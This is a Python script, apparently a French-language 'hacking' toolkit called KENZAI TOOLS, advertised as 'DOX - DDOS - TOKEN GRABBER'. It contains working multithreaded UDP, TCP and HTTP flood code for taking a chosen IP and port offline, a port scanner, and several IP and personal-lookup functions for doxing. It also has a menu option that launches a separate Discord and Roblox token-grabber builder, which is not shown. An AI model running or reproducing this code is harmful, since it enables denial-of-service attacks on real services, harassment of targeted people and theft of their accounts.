#!/usr/bin/env python3
# KENZAI TOOLS v2.0 - Menu principal

import os
import sys
import time
import random
import socket
import threading
import requests
import subprocess
import webbrowser
from colorama import Fore, Style, init

init(autoreset=True)
os.system('title KENZAI TOOLS v2.0')
os.system('mode con: cols=100 lines=45')

stop_attack = False

DISCORD_INVITE = "https://discord.gg/BMubM6Yg5"

def clear():
    os.system('cls')

def banner():
    print(f"""
{Fore.RED}   ██╗  ██╗███████╗███╗   ██╗███████╗ █████╗ ██╗
{Fore.RED}   ██║ ██╔╝██╔════╝████╗  ██║╚══███╔╝██╔══██╗██║
{Fore.RED}   █████╔╝ █████╗  ██╔██╗ ██║  ███╔╝ ███████║██║
{Fore.RED}   ██╔═██╗ ██╔══╝  ██║╚██╗██║ ███╔╝  ██╔══██║██║
{Fore.RED}   ██║  ██╗███████╗██║ ╚████║███████╗██║  ██║██║
{Fore.RED}   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝{Style.RESET_ALL}
{Fore.CYAN}   - KENZAI TOOLS v2.0 -{Style.RESET_ALL}
{Fore.YELLOW}   - DOX - DDOS - TOKEN GRABBER -{Style.RESET_ALL}
{Fore.WHITE}
{Fore.GREEN}┌{'-'*70}┐{Style.RESET_ALL}
{Fore.GREEN}│{Fore.CYAN} Tape 14: TOKEN GRABBER (Discord + Roblox) | 15: Exit{Fore.GREEN}│{Style.RESET_ALL}
{Fore.GREEN}└{'-'*70}┘{Style.RESET_ALL}
""")

def menu():
    print(f"""
{Fore.WHITE}[01] IP Locator       [02] Phone Lookup    [03] Email Hunter
[04] Username Search  [05] DNS Lookup      [06] GeoIP
[07] Whois            [08] Breach Check    [09] Reverse Image
[10] Pastebin Search  [11] IP Trace        [12] DDOS ATTACK
[13] SCAN PORTS       
{Fore.RED}[14] TOKEN GRABBER    [15] Exit{Style.RESET_ALL}

{Fore.YELLOW}[99] Quitter{Style.RESET_ALL}

{Fore.CYAN}v2.0 - Mode: DOX + DDOS + GRABBER{Style.RESET_ALL}
{Fore.RED}kenzai@tools:~/{Style.RESET_ALL} """, end="")

def open_discord():
    webbrowser.open(DISCORD_INVITE)

# ============ FONCTIONS DOX ============
def ip_locator():
    clear()
    print(f"\n{Fore.CYAN}[01] IP Locator{Style.RESET_ALL}\n")
    ip = input("IP: ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}")
        d = r.json()
        if d.get('status') == 'success':
            print(f"\n{Fore.GREEN}IP: {d['query']}")
            print(f"Pays: {d['country']}")
            print(f"Region: {d['regionName']}")
            print(f"Ville: {d['city']}")
            print(f"Lat/Lon: {d['lat']}, {d['lon']}")
            print(f"Carte: https://maps.google.com/?q={d['lat']},{d['lon']}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur{Style.RESET_ALL}")
    input()

def phone_lookup():
    clear()
    print(f"\n{Fore.CYAN}[02] Phone Lookup{Style.RESET_ALL}\n")
    phone = input("Numero (+336XXXXXXXX): ")
    print(f"{Fore.GREEN}Recherche: {phone}{Style.RESET_ALL}")
    input()

def email_hunter():
    clear()
    print(f"\n{Fore.CYAN}[03] Email Hunter{Style.RESET_ALL}\n")
    email = input("Email: ")
    print(f"{Fore.GREEN}Email: {email}{Style.RESET_ALL}")
    input()

def username_search():
    clear()
    print(f"\n{Fore.CYAN}[04] Username Search{Style.RESET_ALL}\n")
    username = input("Pseudo: ")
    sites = ["Twitter", "Instagram", "GitHub", "Reddit", "TikTok"]
    for site in sites:
        print(f"{Fore.YELLOW}Recherche sur {site}...{Style.RESET_ALL}")
        time.sleep(0.2)
    print(f"{Fore.GREEN}Recherche terminee pour: {username}{Style.RESET_ALL}")
    input()

def dns_lookup():
    clear()
    print(f"\n{Fore.CYAN}[05] DNS Lookup{Style.RESET_ALL}\n")
    domain = input("Domaine: ")
    try:
        ip = socket.gethostbyname(domain)
        print(f"{Fore.GREEN}{domain} -> {ip}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur{Style.RESET_ALL}")
    input()

def geoip():
    clear()
    print(f"\n{Fore.CYAN}[06] GeoIP{Style.RESET_ALL}\n")
    ip = input("IP: ")
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json")
        d = r.json()
        print(f"\n{Fore.GREEN}IP: {d.get('ip')}")
        print(f"Ville: {d.get('city')}")
        print(f"Region: {d.get('region')}")
        print(f"Pays: {d.get('country')}")
        if d.get('loc'):
            print(f"Maps: https://maps.google.com/?q={d.get('loc')}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur{Style.RESET_ALL}")
    input()

def whois():
    clear()
    print(f"\n{Fore.CYAN}[07] Whois{Style.RESET_ALL}\n")
    domain = input("Domaine: ")
    print(f"{Fore.GREEN}https://who.is/whois/{domain}{Style.RESET_ALL}")
    input()

def breach_check():
    clear()
    print(f"\n{Fore.CYAN}[08] Breach Check{Style.RESET_ALL}\n")
    email = input("Email: ")
    try:
        r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}")
        if r.status_code == 200:
            print(f"{Fore.RED}Email compromis !{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}Aucune fuite{Style.RESET_ALL}")
    except:
        print(f"{Fore.YELLOW}Erreur{Style.RESET_ALL}")
    input()

def reverse_image():
    clear()
    print(f"\n{Fore.CYAN}[09] Reverse Image{Style.RESET_ALL}\n")
    url = input("URL image: ")
    print(f"{Fore.GREEN}Google: https://www.google.com/searchbyimage?image_url={url}")
    print(f"Yandex: https://yandex.com/images/search?url={url}{Style.RESET_ALL}")
    input()

def pastebin_search():
    clear()
    print(f"\n{Fore.CYAN}[10] Pastebin Search{Style.RESET_ALL}\n")
    query = input("Recherche: ")
    print(f"{Fore.GREEN}https://pastebin.com/search?q={query}{Style.RESET_ALL}")
    input()

def ip_trace():
    clear()
    print(f"\n{Fore.CYAN}[11] IP Trace{Style.RESET_ALL}\n")
    target = input("IP: ")
    print(f"{Fore.YELLOW}Tracage...{Style.RESET_ALL}")
    time.sleep(1)
    print(f"{Fore.GREEN}Termine{Style.RESET_ALL}")
    input()

# ============ DDOS ATTACK ============
def ddos_attack():
    global stop_attack
    clear()
    print(f"{Fore.RED}")
    print("╔══════════════════════════════════════════════════════════╗")
    print("║                 KENZAI DDOS ATTACK                       ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    
    target = input(f"{Fore.YELLOW}[?] IP cible: {Style.RESET_ALL}")
    port = input(f"{Fore.YELLOW}[?] Port (80): {Style.RESET_ALL}") or "80"
    threads = int(input(f"{Fore.YELLOW}[?] Threads (100-1000): {Style.RESET_ALL}"))
    duration = int(input(f"{Fore.YELLOW}[?] Duree secondes: {Style.RESET_ALL}"))
    
    print(f"\n{Fore.RED}[*] Attaque sur {target}:{port}")
    print(f"[*] Threads: {threads}")
    print(f"[*] Duree: {duration}s{Style.RESET_ALL}\n")
    
    stop_attack = False
    
    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop_attack:
            try:
                sock.sendto(random._urandom(1400), (target, int(port)))
            except:
                pass
    
    def tcp_flood():
        while not stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, int(port)))
                sock.close()
            except:
                pass
    
    def http_flood():
        url = f"http://{target}:{port}"
        while not stop_attack:
            try:
                requests.get(url, timeout=2)
            except:
                pass
    
    t = max(1, threads // 3)
    for _ in range(t):
        threading.Thread(target=udp_flood, daemon=True).start()
        threading.Thread(target=tcp_flood, daemon=True).start()
        threading.Thread(target=http_flood, daemon=True).start()
    
    for i in range(duration, 0, -1):
        if stop_attack:
            break
        sys.stdout.write(f"\r{Fore.YELLOW}[⏱] Temps: {i}s | Threads: {threading.active_count()-1}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(1)
    
    stop_attack = True
    print(f"\n\n{Fore.GREEN}[+] Attaque terminee{Style.RESET_ALL}")
    input()

# ============ SCAN PORTS ============
def scan_ports():
    clear()
    print(f"{Fore.RED}")
    print("╔══════════════════════════════════════════════════════════╗")
    print("║              KENZAI - SCAN DE PORTS                      ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    
    target = input(f"{Fore.YELLOW}[?] IP cible: {Style.RESET_ALL}")
    ports = [21, 22, 23, 25, 53, 80, 443, 8080, 3306, 3389, 25565]
    
    print(f"\n{Fore.YELLOW}[*] Scan de {target}...{Style.RESET_ALL}\n")
    
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        if sock.connect_ex((target, port)) == 0:
            print(f"{Fore.GREEN}Port {port}: OUVERT{Style.RESET_ALL}")
        sock.close()
    
    input()

# ============ TOKEN GRABBER BUILDER ============
def open_token_grabber():
    clear()
    print(f"{Fore.YELLOW}[*] Lancement du Token Grabber Builder...{Style.RESET_ALL}")
    grabber_file = os.path.join("builder", "kenzai_token_grabber.py")
    if not os.path.exists(grabber_file):
        print(f"{Fore.RED}[!] Fichier {grabber_file} introuvable{Style.RESET_ALL}")
        input()
        return
    try:
        subprocess.Popen([sys.executable, grabber_file])
        print(f"{Fore.GREEN}[+] Token Grabber Builder lance !{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Erreur: {e}{Style.RESET_ALL}")
    input()

# ============ MAIN ============
def main():
    open_discord()
    
    while True:
        clear()
        banner()
        menu()
        choice = input()
        
        if choice in ["01","1"]: ip_locator()
        elif choice in ["02","2"]: phone_lookup()
        elif choice in ["03","3"]: email_hunter()
        elif choice in ["04","4"]: username_search()
        elif choice in ["05","5"]: dns_lookup()
        elif choice in ["06","6"]: geoip()
        elif choice in ["07","7"]: whois()
        elif choice in ["08","8"]: breach_check()
        elif choice == "09": reverse_image()
        elif choice == "10": pastebin_search()
        elif choice == "11": ip_trace()
        elif choice == "12": ddos_attack()
        elif choice == "13": scan_ports()
        elif choice == "14": open_token_grabber()
        elif choice in ["15","99"]:
            print(f"{Fore.RED}Au revoir{Style.RESET_ALL}")
            sys.exit()
        else:
            print(f"{Fore.RED}Option invalide{Style.RESET_ALL}")
            time.sleep(1)

if __name__ == "__main__":
    main()